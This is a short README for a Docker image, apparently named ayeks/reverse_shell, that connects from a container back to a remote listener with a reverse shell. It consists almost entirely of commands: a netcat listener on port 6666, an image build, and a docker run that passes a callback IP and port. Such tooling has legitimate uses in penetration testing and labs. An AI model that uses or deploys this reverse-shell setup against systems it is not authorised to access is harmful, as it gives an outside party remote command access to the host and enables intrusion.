# Reverse Shell Container

Run a container which connects to a server with a reverse shell.

## Start the server

The reverse shell in the container will connect back to your server.
Open up a port with the following snippet:

```bash
nc -lvvp 6666
```

## Build the image

```bash
docker build -t ayeks/reverse_shell:latest .
```

## Execute the image

Run the reverse shell container with: `docker run --rm -it -e IP=192.168.178.26 -e PORT=6666 ayeks/reverse_shell`
